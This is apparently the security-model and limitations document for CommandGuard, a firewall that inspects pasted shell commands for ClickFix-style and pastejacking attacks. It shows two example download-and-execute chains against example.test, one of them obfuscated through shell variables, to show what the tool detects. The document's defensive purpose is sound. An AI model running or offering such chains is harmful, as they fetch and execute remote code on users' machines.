# Security Model And Limitations

CommandGuard is a paste firewall for shell commands. Its goal is to reduce social-engineering attacks where someone convinces a user to paste dangerous text into the terminal.

## Protects Against

CommandGuard is mainly intended for:

- ClickFix-style attacks;
- pastejacking;
- hidden shell commands;
- download-and-execute chains;
- simple credential exfiltration;
- persistence through shell profiles, cron, or user systemd;
- destructive filesystem commands.

## Does Not Fully Protect Against

CommandGuard does not fully protect against:

- malware that is already running;
- malicious binaries you choose to install;
- vulnerabilities in the shell or terminal;
- attacks that do not involve paste;
- complex Bash programs outside the v0.1 analyzer;
- remote scripts whose content is not visible locally.

## No Remote Fetching

If a command does this:

```bash
curl https://example.test/script.sh | bash
```

CommandGuard does not download `script.sh` to inspect it. It warns based on the visible chain:

```text
network source -> shell interpreter
```

This is intentional. Analysis should not create network traffic or alert attackers that someone is inspecting the command.

## Confidence Is Not A Guarantee

`High confidence` means:

```text
The visible command clearly shows this effect.
```

It does not mean:

```text
We know for certain that this is malware.
```

A legitimate installer can also use `curl | bash`. CommandGuard warns because the pattern is risky, not because it is always malicious.

## Why Semantic Analysis Instead Of Only Regex

A simple rule like "block `curl | bash`" misses variants:

```bash
a=curl
b=https://example.test/x.sh
"$a" -fsSL "$b" -o /tmp/z
sh /tmp/z
```

CommandGuard tries to follow effects instead:

```text
download -> file -> interpreter
```

This is not complete Bash semantics yet, but it is more robust than text matching alone.

## Safe Benchmark Data

Fixtures under `bench/` must remain inert:

- use `example.test` or local sinkholes;
- do not publish real malware;
- do not publish real credentials;
- do not use working command-and-control endpoints;
- keep payloads demonstrative and harmless.
